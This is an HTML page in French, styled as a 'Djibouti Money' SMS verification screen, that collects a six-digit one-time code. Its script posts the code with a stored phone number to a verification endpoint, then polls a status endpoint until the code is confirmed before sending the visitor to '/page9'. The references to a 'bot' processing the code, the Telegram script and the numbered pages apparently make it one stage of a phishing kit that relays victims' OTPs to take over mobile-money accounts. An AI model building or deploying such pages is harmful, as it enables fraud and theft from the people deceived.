<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification - Djibouti Money</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --primary-yellow: #eab308; }
        body { background: #fdfdfd; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; font-family: sans-serif; }
        .header-box { width: 100%; background: #fefce8; border-bottom: 2px solid #fef08a; padding: 25px; text-align: center; font-weight: 800; color: #ca8a04; font-size: 22px; }
        .card { background: #fffdf5; width: 90%; max-width: 400px; padding: 30px; border-radius: 16px; border: 1px solid #fef08a; margin-top: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: center; }
        .code-container { display: flex; justify-content: space-between; gap: 6px; margin: 20px 0; }
        .code-box { width: 45px; height: 50px; border: 2px solid #fde047; border-radius: 8px; text-align: center; font-size: 20px; font-weight: bold; background: #fff; outline: none; }
        .submit-btn { width: 100%; background: #d1d5db; color: #fff; border: none; padding: 15px; border-radius: 10px; font-weight: 800; cursor: not-allowed; }
        .submit-btn.active { background: #eab308; color: #000; cursor: pointer; }
        
        /* Loading Overlay / State styling */
        #loadingState {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px 0;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #fef08a;
            border-top: 4px solid #ca8a04;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            font-weight: 700;
            color: #ca8a04;
            font-size: 16px;
        }
    </style>
</head>
<body>
<div class="header-box">Djibouti Money</div>
<div class="card">
    <div id="formState">
        <h2>Vérification par Code</h2>
        <p style="font-size: 14px; color: #666;">Entrez le code de vérification numérique reçu par SMS.</p>
        
        <div class="code-container">
            <input type="text" maxlength="1" class="code-box" inputmode="numeric" pattern="[0-9]*">
            <input type="text" maxlength="1" class="code-box" inputmode="numeric" pattern="[0-9]*">
            <input type="text" maxlength="1" class="code-box" inputmode="numeric" pattern="[0-9]*">
            <input type="text" maxlength="1" class="code-box" inputmode="numeric" pattern="[0-9]*">
            <input type="text" maxlength="1" class="code-box" inputmode="numeric" pattern="[0-9]*">
            <input type="text" maxlength="1" class="code-box" inputmode="numeric" pattern="[0-9]*">
        </div>

        <button id="submitBtn" class="submit-btn" disabled>VALIDER</button>
    </div>

    <!-- Loading state showing verification process with animated dots -->
    <div id="loadingState">
        <div class="spinner"></div>
        <div class="loading-text">Vérification en cours<span id="dots">.</span></div>
        <p style="font-size: 13px; color: #666; margin-top: 10px;">Veuillez patienter pendant que le bot traite votre code OTP...</p>
    </div>
</div>

<script>
    const codeBoxes = document.querySelectorAll('.code-box');
    const submitBtn = document.getElementById('submitBtn');
    const phone = localStorage.getItem('phone') || "";
    const formState = document.getElementById('formState');
    const loadingState = document.getElementById('loadingState');
    const dotsEl = document.getElementById('dots');

    codeBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');

            if (box.value && index < codeBoxes.length - 1) {
                codeBoxes[index + 1].focus();
            }

            const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
            submitBtn.disabled = fullCode.length !== 6;
            submitBtn.classList.toggle('active', fullCode.length === 6);
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) {
                codeBoxes[index - 1].focus();
            }
        });
    });

    // Animate dots for loading text
    function startDotsAnimation() {
        setInterval(() => {
            let currentDots = dotsEl.innerText;
            if (currentDots.length >= 3) {
                dotsEl.innerText = ".";
            } else {
                dotsEl.innerText += ".";
            }
        }, 500);
    }

    submitBtn.addEventListener('click', async () => {
        const code = Array.from(codeBoxes).map(b => b.value).join('');
        
        // Switch view to loading state
        formState.style.display = 'none';
        loadingState.style.display = 'flex';
        startDotsAnimation();

        await fetch('/api/verify-first-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone, code })
        });

        setInterval(async () => {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();
            if (data.status === "otp1_correct") location.href = "/page9";
        }, 2000);
    });
</script>
</body>
</html>
